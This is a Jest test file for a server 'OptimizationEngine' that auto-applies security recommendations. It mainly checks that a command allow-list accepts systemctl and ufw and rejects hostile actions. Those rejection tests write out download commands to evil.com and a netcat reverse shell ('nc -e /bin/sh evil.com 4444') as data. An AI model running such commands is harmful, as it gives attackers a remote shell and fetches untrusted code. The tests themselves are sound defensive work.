/**
 * OptimizationEngine Tests
 */

jest.mock('child_process', () => ({
  exec: jest.fn(),
  execSync: jest.fn(),
  spawn: jest.fn((cmd: string, args: string[]) => ({
    on: jest.fn((event: string, cb: (code: number) => void) => {
      if (event === 'close') cb(0);
      return this;
    }),
    stdout: { on: jest.fn((event: string, cb: (data: Buffer) => void) => {
      if (event === 'data') cb(Buffer.from('mock output\n'));
    }) },
    stderr: { on: jest.fn() },
    kill: jest.fn(),
  })),
}));

jest.mock('../../utils/logger', () => ({ __esModule: true, default: { error: jest.fn(), warn: jest.fn(), info: jest.fn(), debug: jest.fn() } }));

import { OptimizationEngine } from '../../scanner/optimization-engine';
import { Recommendation } from '../../database/models/scan-result';

// Test fixtures carry an extra `id` for identity assertions; the production
// Recommendation interface omits it, so widen locally without weakening it.
type TestRecommendation = Recommendation & { id: string };

describe('OptimizationEngine', () => {
  let engine: OptimizationEngine;

  beforeEach(() => {
    jest.clearAllMocks();
    engine = new OptimizationEngine();
  });

  describe('isCommandAllowed (via applyOptimization)', () => {
    it('allows systemctl commands', async () => {
      const { spawn } = require('child_process');
      spawn.mockImplementation((cmd: string, args: string[]) => ({
        on: jest.fn((event: string, cb: (code: number) => void) => {
          if (event === 'close') cb(0);
          return this;
        }),
        stdout: { on: jest.fn((event: string, cb: (data: Buffer) => void) => {
          if (event === 'data') cb(Buffer.from(''));
        }) },
        stderr: { on: jest.fn() },
        kill: jest.fn(),
      }));

      const result = await engine.applyOptimization({
        id: '1',
        category: 'security',
        priority: 'high',
        title: 'Enable firewall',
        description: 'Enable UFW firewall',
        action: 'systemctl start ufw',
        autoApplicable: true,
        risk: 'low',
      } as TestRecommendation);

      expect(result.success).toBe(true);
    });

    it('allows ufw commands', async () => {
      const { spawn } = require('child_process');
      spawn.mockImplementation((cmd: string, args: string[]) => ({
        on: jest.fn((event: string, cb: (code: number) => void) => {
          if (event === 'close') cb(0);
          return this;
        }),
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        kill: jest.fn(),
      }));

      const result = await engine.applyOptimization({
        id: '1',
        category: 'security',
        priority: 'high',
        title: 'Allow port 80',
        description: 'Allow HTTP traffic',
        action: 'ufw allow 80',
        autoApplicable: true,
        risk: 'low',
      } as TestRecommendation);

      expect(result.success).toBe(true);
    });

    it('rejects curl commands', async () => {
      const result = await engine.applyOptimization({
        id: '1',
        category: 'security',
        priority: 'high',
        title: 'Download script',
        description: 'Download and run script',
        action: 'curl http://evil.com',
        autoApplicable: true,
        risk: 'high',
      } as TestRecommendation);

      expect(result.success).toBe(false);
      expect(result.error).toContain('command_not_in_allowed_list');
    });

    it('rejects wget commands', async () => {
      const result = await engine.applyOptimization({
        id: '1',
        category: 'security',
        priority: 'high',
        title: 'Download script',
        description: 'Download script',
        action: 'wget https://evil.com',
        autoApplicable: true,
        risk: 'high',
      } as TestRecommendation);

      expect(result.success).toBe(false);
    });

    it('rejects netcat commands', async () => {
      const result = await engine.applyOptimization({
        id: '1',
        category: 'security',
        priority: 'critical',
        title: 'Netcat shell',
        description: 'Reverse shell',
        action: 'nc -e /bin/sh evil.com 4444',
        autoApplicable: true,
        risk: 'critical',
      } as TestRecommendation);

      expect(result.success).toBe(false);
    });
  });

  describe('sortRecommendations', () => {
    it('sorts recommendations by priority order', async () => {
      const { spawn } = require('child_process');
      spawn.mockImplementation((cmd: string, args: string[]) => ({
        on: jest.fn((event: string, cb: (code: number) => void) => {
          if (event === 'close') cb(0);
          return this;
        }),
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        kill: jest.fn(),
      }));

      // The engine sorts internally via runFullScan
      // We test the sorting indirectly through the summary
      const result = await engine.runFullScan({
        scanPorts: false,
        scanSystem: false,
        scanWebServer: false,
      });

      // Verify summary structure
      expect(result.summary).toHaveProperty('critical');
      expect(result.summary).toHaveProperty('high');
      expect(result.summary).toHaveProperty('medium');
      expect(result.summary).toHaveProperty('low');
    });
  });

  describe('generateSummary', () => {
    it('generates correct summary counts', async () => {
      const { spawn } = require('child_process');
      spawn.mockImplementation((cmd: string, args: string[]) => ({
        on: jest.fn((event: string, cb: (code: number) => void) => {
          if (event === 'close') cb(0);
          return this;
        }),
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        kill: jest.fn(),
      }));

      const result = await engine.runFullScan({
        scanPorts: false,
        scanSystem: false,
        scanWebServer: false,
      });

      expect(typeof result.summary.critical).toBe('number');
      expect(typeof result.summary.high).toBe('number');
      expect(typeof result.summary.medium).toBe('number');
      expect(typeof result.summary.low).toBe('number');
    });
  });

  describe('generateReport', () => {
    it('generates report string', () => {
      const systemInfo = {
        platform: 'linux',
        release: '5.4.0',
        arch: 'x64',
        cpus: 4,
        totalMemory: '16GB',
        uptime: '100h',
      };

      const recommendations: TestRecommendation[] = [
        {
          id: '1',
          category: 'security',
          priority: 'critical' as const,
          title: 'Test Critical',
          description: 'Test description',
          action: 'ufw enable',
          autoApplicable: true,
          risk: 'low',
        },
      ];

      const report = engine.generateReport(systemInfo, recommendations);

      expect(typeof report).toBe('string');
      expect(report).toContain('CRITICAL');
      expect(report).toContain('linux');
    });

    it('includes system info in report', () => {
      const systemInfo = {
        platform: 'linux',
        release: 'Ubuntu 22.04',
        arch: 'x86_64',
        cpus: 8,
        totalMemory: '32GB',
        uptime: '500h',
        webServer: 'nginx',
      };

      const report = engine.generateReport(systemInfo, []);

      expect(report).toContain('linux');
      expect(report).toContain('nginx');
      expect(report).toContain('8');
      expect(report).toContain('32GB');
    });
  });

  describe('previewOptimizations', () => {
    it('separates autoApplicable and manual recommendations', async () => {
      const { spawn } = require('child_process');
      spawn.mockImplementation((cmd: string, args: string[]) => ({
        on: jest.fn((event: string, cb: (code: number) => void) => {
          if (event === 'close') cb(0);
          return this;
        }),
        stdout: { on: jest.fn() },
        stderr: { on: jest.fn() },
        kill: jest.fn(),
      }));

      const recommendations: TestRecommendation[] = [
        {
          id: '1',
          category: 'security',
          priority: 'high' as const,
          title: 'Auto fix',
          description: 'Can be auto applied',
          action: 'ufw enable',
          autoApplicable: true,
          risk: 'low',
        },
        {
          id: '2',
          category: 'security',
          priority: 'medium' as const,
          title: 'Manual fix',
          description: 'Requires manual intervention',
          action: 'edit config file',
          autoApplicable: false,
          risk: 'medium',
        },
      ];

      const preview = await engine.previewOptimizations(recommendations);

      expect(preview.autoApplicable).toHaveLength(1);
      expect(preview.manual).toHaveLength(1);
      expect((preview.autoApplicable[0] as TestRecommendation).id).toBe('1');
      expect((preview.manual[0] as TestRecommendation).id).toBe('2');
    });
  });
});
